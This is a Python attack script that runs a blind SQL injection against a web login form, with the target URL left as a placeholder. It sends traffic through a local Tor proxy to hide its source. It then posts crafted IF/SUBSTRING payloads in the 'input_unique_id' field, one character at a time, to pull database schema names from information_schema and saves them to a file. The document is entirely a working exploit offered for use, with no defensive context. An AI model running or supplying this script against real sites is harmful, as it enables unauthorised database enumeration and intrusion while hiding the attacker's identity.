import time
import requests

url = "--target--"
schema = "--target--"

#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = [
"_",
"e","t","a","i","n","o","s","h","r","d","l","u","c","m","f","w","y","g","p","b","v","k","q","j","x","z",
#"E","T","A","I","N","O","S","H","R","D","L","U","C","M","F","W","Y","G","P","B","V","K","Q","J","X","Z",
#"0","1","2","3","4","5","6","7","8","9"
]
#DO NOT CHANGE THIS PART

out = open("schematic.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("schematic.txt","a")


schemacount = 7
correct = "p"


isSchemaFinished = False
for schema in range(0,schemacount):
    char = 1
    temp = ""
    out.write(str(schema)+" ")
    while not isSchemaFinished:
        for letter in alphabet:
            injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(schema_name,"+str(char)+",1) FROM information_schema.schemata LIMIT 1 OFFSET "+str(schema)+"),1,'a'); -- "
            response = requests.post(
                url,
                cookies=cookies,
                data={
                'input_unique_id': injection,
                'input_pass': 'a',
                'btn_login': 'Submit',
                },
                verify=False,
                proxies=prox
            )

            #print(response.text)
            time.sleep(0.3)

            if response.text[40]=='p':
                print("correct, char "+str(char)+": "+letter)
                out.write(letter)
                temp += letter
                char += 1
                break
        else:
            print("schema done")
            out.write("\n")
            isSchemaFinished = True
    isSchemaFinished = False
    print("Schema "+str(schema)+": "+temp)
    print("next schema")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime)